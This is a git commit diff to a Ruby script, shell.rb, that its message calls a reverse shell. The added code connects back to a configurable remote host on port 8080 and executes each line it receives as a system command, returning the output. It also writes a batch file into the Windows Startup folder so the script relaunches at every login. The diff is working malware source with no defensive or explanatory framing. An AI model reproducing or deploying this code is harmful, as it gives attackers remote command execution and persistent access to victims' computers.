f4c3fe44f7f90679b9d9d01e59241627f5bf483c
krishpranav <krisna.pranav@gmail.com>
2022-10-03 19:01:14 +0530

    shell: update reverse shell

--- shell.rb
+++ shell.rb
@@ -2,19 +2,38 @@ require 'socket'
 require 'etc'
 require 'open3'
 
-RHOST = ""
+RHOST = ""  
 PORT = "8080"
 
 def rev()
     begin
-        sock = TCPSocket.new "#{RHOST}, #{PORT}"
+        sock = TCPSocket.new "#{RHOST}", "#{PORT}"
         sock.puts "[\033[1;92m*\033[1;97m] Connected!"
         sock.print ">> "
-    rescue 
-        sleep 20
-        retry
-    end
-
+        rescue
+          sleep 20
+          retry
+        end
+        
+        begin
+          while line = sock.gets
+            Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
+                      IO.copy_stream(stdout_and_stderr, sock)
+                      end  
+          end
+        rescue
+          retry
+    end 
 end
 
+def persist()
+    user = Etc.getlogin
+    path = "C:/Users/#{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+    Dir.chdir(path)
+    dir = __dir__
+    v = '""'
+    f = File.open("open.bat", "w") {|f| f.write("ruby #{dir}/main.rb") }
+end
+
+persist()
 rev()
